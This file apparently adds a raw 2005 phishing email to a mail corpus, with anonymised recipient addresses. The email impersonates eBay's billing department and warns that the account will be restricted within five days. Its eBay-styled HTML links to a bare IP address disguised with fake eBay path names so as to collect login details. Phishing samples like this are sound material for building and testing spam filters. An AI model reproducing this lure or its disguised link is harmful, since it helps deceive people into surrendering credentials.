@@ -1,0 +1,238 @@
+ aw-confirm@eBay.com  Thu Jun 16 21:55:42 2005
+Return-Path: <aw-confirm@eBay.com>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.0.2.3])
+	by naughty.domain.com (Postfix) with ESMTP id 05EC4536E8B
+	for <username@login.domain.com>; Thu, 16 Jun 2005 21:55:42 -0400 (EDT)
+Received: from mail2.domain.com (mail2.domain.com [192.168.3.4])
+	by mail1.domain.com (Postfix) with ESMTP id B3F0A85A8FE
+	for <username@domain.com>; Thu, 16 Jun 2005 21:55:40 -0400 (EDT)
+Received: from 192.168.3.4 (unknown [212.118.17.208])
+	by mail2.domain.com (Postfix) with SMTP id 9F1A51836A3
+	for <username@domain.com>; Thu, 16 Jun 2005 21:55:39 -0400 (EDT)
+Received: from 232.149.143.176 by ; Thu, 24 Mar 2005 18:57:26 +0400
+Message-ID: <JFEPNHMAVVKPJWGVACEUQLXQW@eBay.com>
+From: "eBay Billing Dep" <aw-confirm@eBay.com>
+Reply-To: "eBay Billing Dep" <aw-confirm@eBay.com>
+To: username@domain.com
+Subject: youe eBay account could be suspended due Updates.
+Date: Thu, 24 Mar 2005 10:51:26 -0400
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--417093913203786357"
+X-IP: 141.128.104.52
+X-Priority: 3
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 5
+
+----417093913203786357
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+
+
+<xbody bgcolor=3D"#ffffff"><!--Header code starts--><!--2004-11-02 12:42:4=
+9,,-->
+<!--Header code ends--><img src=3D"https://adfarm.mediaplex.com/ad/bk/711-=
+518-1801-0?Reg=3D1&mpuid=3D168739263;0"  width=3D"1" height=3D"1" border=3D=
+"0"><img src=3D"https://altfarm.mediaplex.com/ad/bk/1065-3899-1801-0?Reg-I=
+nt=3D1&mpuid=3D168739263;0"  width=3D"1" height=3D"1" border=3D"0"><img bo=
+rder=3D"0" src=3D"https://securepics.ebaystatic.com/aw/pics/register/Heade=
+rRegisterUS_387x40.gif" width=3D"387" height=3D"40">&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<img border=3D"0" src=3D"http://pics.ebaystatic.com/aw/pics/navbar/powered=
+ByLogo_112x22.gif"  width=3D"112" height=3D"22"><table border=3D"0" cellpa=
+dding=3D"0" cellspacing=3D"0" width=3D"600">
+<tr>
+<td><img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  width=3D=
+"1" height=3D"10" alt=3D" " title=3D""></td>
+</tr>
+</table><cursive src=3D"https://secureinclude.ebaystatic.com/js/e381/us/re=
+gistrationbody.js"></script><cursive language=3D"_JavaScript"><!--					
+						var surveyConfig =3D new EBaySurveyConfig("survey_config");
+							surveyConfig.siteID =3D "0";
+							surveyConfig.partnerID =3D "2";
+							surveyConfig.entryPoint=3D "BIDN";
+							surveyConfig.hiddenPopupFolderUrl =3D "http://pages.ebay.com/popout=
+/";
+							surveyConfig.disable =3D false;  //partner contingency
+				//
+				--></script><table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" wi=
+dth=3D"624">
+<tr>
+<td colspan=3D"2" bgcolor=3D"#9999cc" width=3D"622"><img src=3D"https://se=
+curepics.ebaystatic.com/aw/pics/s.gif"  width=3D"1" height=3D"2" alt=3D" "=
+ title=3D""></td>
+</tr>
+<tr bgcolor=3D"#d6dcfe">
+<td width=3D"25">=A0</td>
+<td width=3D"595" valign=3D"middle">
+<table border=3D"0" width=3D"100%" cellpadding=3D"1" cellspacing=3D"0">
+<tr>
+<td nowrap=3D"yes" valign=3D"middle" class=3D"pagetitle"><b>Dear eBay memb=
+er,</b></td>
+<td align=3D"right" nowrap=3D"yes">=A0</td>
+</tr>
+</table>
+</td>
+</tr>
+<tr>
+<td colspan=3D"2" bgcolor=3D"#9999cc" width=3D"622"><img src=3D"https://se=
+curepics.ebaystatic.com/aw/pics/s.gif"  width=3D"1" height=3D"2" alt=3D" "=
+ title=3D""></td>
+</tr>
+</table>
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"624">
+<tr bgcolor=3D"#eceefc" valign=3D"top">
+<td width=3D"25">=A0</td>
+<td width=3D"599">
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"1">
+<tr valign=3D"middle">
+<td></td>
+</tr>
+</table>
+</td>
+</tr>
+</table><form target=3D"_blank" onsubmit=3D"return ShowFormWarning()"  act=
+ion=3D"http://cgi4.ebay.com/ws1/eBayISAPI.dll"  name=3D"RegisterConfirmEma=
+il"><input type=3D"hidden" name=3D"MfcISAPICommand" value=3D"RedirectToDom=
+ain"><input type=3D"hidden" name=3D"DomainUrl" value=3D"">
+	<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"622">
+<tr>
+<td width=3D"23">
+<img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  alt=3D" " ti=
+tle=3D"" width=3D"1" height=3D"1"></td>
+<td valign=3D"top" nowrap width=3D"595">
+ <font size=3D"2">Dear eBay user,<br>
+                            During our regular update and verification of =
+the accounts, we
+ could not verify your current information. Either your information has ch=
+anged or it is incomplete.<br>
+                            Please update and verify your information by s=
+igning in your account below:<br>
+                            If the account information is not updated to c=
+urrent information within 5 days then, your access to bid or buy on eBay w=
+ill be restricted.</font><br>
+                            <br>
+ <a target=3D"_blank" href=3D"http://62.193.219.73/acounts/memb/avncenter/=
+dll87443/.BayISAPI.dll/hgdas676bsda6gwcv7zfcwfcwf34gfwf23g235f134f3fg3f&bh=
+dfahva68532hbhwseBayISAPI.dllPaymentLanding&ssPageName=3DhhpayUSf&=3Duserh=
+gads&secure&ssl7r2vbd7d5b.html">Click here to complete our web
+ form.</a></td>
+
+
+</tr>
+<tr>
+<td width=3D"23"><img src=3D"https://securepics.ebaystatic.com/aw/pics/s.g=
+if"  width=3D"1" height=3D"10" alt=3D" " title=3D""></td>
+</tr>
+<tr>
+<td width=3D"23">
+<img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  alt=3D" " ti=
+tle=3D"" width=3D"1" height=3D"1"></td>
+<td valign=3D"top" nowrap width=3D"595">=A0</td>
+</tr>
+<tr>
+<td width=3D"23"><img src=3D"https://securepics.ebaystatic.com/aw/pics/s.g=
+if"  width=3D"1" height=3D"10" alt=3D" " title=3D""></td>
+</tr>
+<tr>
+<td width=3D"23">
+<img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  alt=3D" " ti=
+tle=3D"" width=3D"1" height=3D"1"></td>
+<td valign=3D"top" nowrap width=3D"595">
+						<font size=3D"2">As outlined in our User Agreement, eBay will 
+						periodically send you<br>
+						information about site changes and enhancements. Visit 
+						our
+						<a target=3D"_blank"  href=3D"http://pages.ebay.com/help/policies/pr=
+ivacy-policy.html?ssPageName=3Df:f:US" >
+						Privacy<br>
+						Policy</a> and
+						<a target=3D"_blank"  href=3D"http://pages.ebay.com/help/policies/us=
+er-agreement.html?ssPageName=3Df:f:US" >
+						User Agreement</a> if you have any questions.</font></td>
+</tr>
+<tr>
+<td width=3D"23">
+<img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  alt=3D" " ti=
+tle=3D"" width=3D"1" height=3D"1"></td>
+</tr>
+<tr>
+<td width=3D"23" height=3D"19">=A0</td>
+</tr>
+<tr>
+<td width=3D"23"><img src=3D"https://securepics.ebaystatic.com/aw/pics/s.g=
+if"  width=3D"1" height=3D"10" alt=3D" " title=3D""></td>
+</tr>
+<tr>
+<td colspan=3D"2" height=3D"19" width=3D"620">
+=A0</td>
+</tr>
+<tr>
+<td width=3D"23"><img src=3D"https://securepics.ebaystatic.com/aw/pics/s.g=
+if"  width=3D"1" height=3D"10" alt=3D" " title=3D""></td>
+</tr>
+<tr>
+<td width=3D"23">
+<img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  alt=3D" " ti=
+tle=3D"" width=3D"1" height=3D"1">=A0=A0=A0=A0=A0 </td>
+<td align=3D"left" height=3D"23" width=3D"595">
+<table cellpadding=3D"0" cellspacing=3D"1" bgcolor=3D"#9999cc" border=3D"0=
+" width=3D"104%">
+<tr>
+<td bgcolor=3D"#eceefc" align=3D"center" height=3D"23"><b>Thank you!</b></=
+td>
+</tr>
+</table>
+</td>
+</tr>
+</table>
+</form>
+<p><br><a href=3D"http://pages.ebay.com/community/aboutebay/?ssPageName=3D=
+f:f:US" target=3D"_blank">About eBay</a> |
+<a href=3D"http://www2.ebay.com/aw/marketing.shtml?ssPageName=3Df:f:US" ta=
+rget=3D"_blank"> Announcements</a> |
+<a href=3D"http://pages.ebay.com/securitycenter/?ssPageName=3Df:f:US" targ=
+et=3D"_blank"> Security Center</a> |
+<a href=3D"http://pages.ebay.com/help/policies/hub.html?fromFeature=3DMy=
+%20eBay&amp;ssPageName=3Df:f:US" target=3D"_blank"> Policies</a> |
+<a href=3D"http://pages.ebay.com/sitemap.html?ssPageName=3Df:f:US" target=3D=
+"_blank"> Site Map</a> |
+<a href=3D"http://pages.ebay.com/help/myebay/index.html?fromFeature=3DMy=
+%20eBay&amp;ssPageName=3Df:f:US" target=3D"_blank"> Help</a></p>
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"783" heig=
+ht=3D"104">
+<tr class=3D"help" valign=3D"top">
+<td class=3D"navigation" width=3D"781" height=3D"104">
+<font size=3D"1" face=3D"Arial" color=3D"#666666">Copyright =A9 1995-2005 =
+eBay Inc. All Rights Reserved. Designated trademarks and brands are the pr=
+operty of
+  their respective owners. Use of this Web site constitutes acceptance of =
+the eBay
+  <a href=3D"http://pages.ebay.com/help/policies/user-agreement.html?fromF=
+eature=3DMy%20eBay&amp;ssPageName=3Df:f:US" target=3D"_blank"> User Agreem=
+ent</a> and
+  <a href=3D"http://pages.ebay.com/help/policies/privacy-policy.html?fromF=
+eature=3DMy%20eBay&amp;ssPageName=3Df:f:US" target=3D"_blank"> Privacy
+  Policy</a>.</font><font size=3D"1"> </font>
+  <p>&nbsp;<a target=3D"_blank"  href=3D"http://pages.ebay.com/help/commun=
+ity/png-priv.html" ><img src=3D"http://pics.ebaystatic.com/aw/pics/truste_=
+button.gif"  align=3D"right" border=3D"0" hspace=3D"4" vspace=3D"2" width=3D=
+"116" height=3D"31"></a></p>
+  <p><img src=3D"https://securepics.ebaystatic.com/aw/pics/s.gif"  alt=3D"=
+" width=3D"1" height=3D"10"></p>
+</td>
+</tr>
+</table>
+<table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" width=3D"100=
+%">
+<tr><td height=3D"10"><img src=3D"https://securepics.ebaystatic.com/aw/pic=
+s/s.gif"  alt=3D"" width=3D"760" height=3D"1"></td></tr>
+</table></xbody>
+
+----417093913203786357--
